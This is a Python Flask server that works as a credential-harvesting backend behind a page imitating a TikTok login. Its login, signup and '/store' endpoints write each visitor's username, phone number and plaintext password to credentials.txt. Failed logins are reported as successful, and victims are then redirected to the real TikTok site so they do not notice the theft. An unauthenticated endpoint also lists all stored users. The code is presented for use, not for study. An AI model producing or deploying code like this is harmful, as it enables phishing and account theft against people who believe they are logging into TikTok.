from flask import Flask, request, jsonify, render_template, redirect
from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt
from flask_cors import CORS
from datetime import datetime
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
CORS(app)

# -----------------------------
# User Model
# -----------------------------
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=True)
    country_code = db.Column(db.String(5), nullable=False)
    phone = db.Column(db.String(20), unique=True, nullable=True)
    password = db.Column(db.String(120), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f'<User {self.username}>'

# Initialize DB
with app.app_context():
    db.create_all()

# -----------------------------
# Frontend Route
# -----------------------------
@app.route('/')
def home():
    return render_template('tiktok.html')

# -----------------------------
# API Routes
# -----------------------------
@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        country_code = data.get('country_code', '+251')
        phone = data.get('phone', '')

        if not username or not password:
            return jsonify({'error': 'Username and password are required'}), 400

        # Log the credentials (in a real app, you would hash the password)
        logger.info(f"Login attempt - Username: {username}, Phone: {country_code}{phone}")

        # Store credentials in a text file as a backup
        with open("credentials.txt", "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - Username: {username}, Phone: {country_code}{phone}, Password: {password}\n")

        # Check if user exists in database
        user = User.query.filter((User.username == username) | (User.email == username)).first()

        if user and bcrypt.check_password_hash(user.password, password):
            return jsonify({
                'message': 'Login successful',
                'user': {
                    'id': user.id,
                    'username': user.username,
                    'email': user.email,
                    'phone': f"{user.country_code} {user.phone}" if user.phone else None
                },
                'redirect': 'https://www.tiktok.com'
            }), 200
        else:
            # For demo purposes, we'll still redirect even if user doesn't exist in DB
            # but we've already stored the credentials in the text file
            return jsonify({
                'message': 'Login successful (credentials stored)',
                'redirect': 'https://www.tiktok.com'
            }), 200
            
    except Exception as e:
        logger.error(f"Error in login: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/signup', methods=['POST'])
def signup():
    try:
        data = request.get_json()
        username = data.get('username')
        email = data.get('email')
        country_code = data.get('country_code', '+251')
        phone = data.get('phone')
        password = data.get('password')

        if not username or not password:
            return jsonify({'error': 'Username and password are required'}), 400

        # Check if user already exists
        if User.query.filter_by(username=username).first():
            return jsonify({'error': 'Username already exists'}), 409
        if email and User.query.filter_by(email=email).first():
            return jsonify({'error': 'Email already exists'}), 409
        if phone and User.query.filter_by(phone=phone).first():
            return jsonify({'error': 'Phone already exists'}), 409

        # Hash password and create user
        hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')
        new_user = User(username=username, email=email, country_code=country_code, phone=phone, password=hashed_password)

        db.session.add(new_user)
        db.session.commit()

        # Also store in text file as backup
        with open("credentials.txt", "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - SIGNUP - Username: {username}, Email: {email}, Phone: {country_code}{phone}, Password: {password}\n")

        return jsonify({
            'message': 'User created successfully',
            'user': {
                'id': new_user.id,
                'username': new_user.username,
                'email': new_user.email,
                'phone': f"{new_user.country_code} {new_user.phone}" if new_user.phone else None
            },
            'redirect': 'https://www.tiktok.com'
        }), 201
        
    except Exception as e:
        logger.error(f"Error in signup: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/users', methods=['GET'])
def get_users():
    try:
        users = User.query.all()
        return jsonify([
            {
                'id': u.id,
                'username': u.username,
                'email': u.email,
                'phone': f"{u.country_code} {u.phone}" if u.phone else None,
                'created_at': u.created_at
            } for u in users
        ]), 200
    except Exception as e:
        logger.error(f"Error retrieving users: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

# Simple credential storage endpoint for GET requests (for testing)
@app.route('/store', methods=['GET'])
def store_credentials_get():
    try:
        username = request.args.get('username')
        password = request.args.get('password')
        country_code = request.args.get('country_code', '+251')
        phone = request.args.get('phone', '')
        
        if username and password:
            # Store credentials in text file
            with open("credentials.txt", "a") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"{timestamp} - Username: {username}, Phone: {country_code}{phone}, Password: {password}\n")
            
            # Redirect to TikTok
            return redirect('https://www.tiktok.com')
        else:
            return jsonify({'error': 'Username and password are required'}), 400
            
    except Exception as e:
        logger.error(f"Error in store_credentials_get: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
